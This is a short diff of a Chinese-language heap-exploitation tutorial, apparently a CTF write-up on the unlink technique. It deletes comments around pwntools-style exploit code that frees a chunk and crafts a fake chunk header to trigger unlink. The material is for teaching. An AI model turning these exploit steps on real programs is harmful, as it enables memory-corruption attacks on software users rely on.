@@ -53,14 +53,9 @@ fake ptr[0] chunk's nextchunk----->+-----------------+
                                            图1
 释放 chunk1 - 覆盖 chunk2 - 释放 chunk2
 对应的代码如下
-
-
-# edit the chunk1 to overwrite the chunk2
 deletenote(1)
 content = 'a' * 16 + p64(0xa0) + p64(0x90)
 newnote(0, content)
-# delete note 2 to trigger the unlink
-# after unlink, ptr[0] = ptr - 0x18
 deletenote(2)
 首先释放 chunk1，由于该 chunk 属于 fastbin，所以下次在申请的时候仍然会申请到该 chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖 chunk2，覆盖之后如图 2 所示。
 
